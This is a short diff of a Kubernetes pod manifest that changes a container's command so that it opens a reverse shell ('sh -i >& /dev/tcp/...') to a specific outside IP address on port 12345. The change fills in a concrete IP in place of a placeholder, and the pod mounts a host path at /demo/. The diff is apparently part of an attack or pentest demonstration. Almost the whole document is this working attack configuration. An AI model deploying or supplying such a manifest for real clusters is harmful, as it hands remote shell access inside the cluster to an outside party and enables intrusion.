@@ -6,7 +6,7 @@ spec:
   containers:
   - name: alpine
     image: ubuntu
-    command: ['/bin/bash', '-c', 'sh -i >& /dev/tcp/<Reverse shell IP>/12345 0>&1']
+    command: ['/bin/bash', '-c', 'sh -i >& /dev/tcp/40.83.187.161/12345 0>&1']
     volumeMounts:
     - mountPath: /demo/
       name: mount-demo-into-mnt
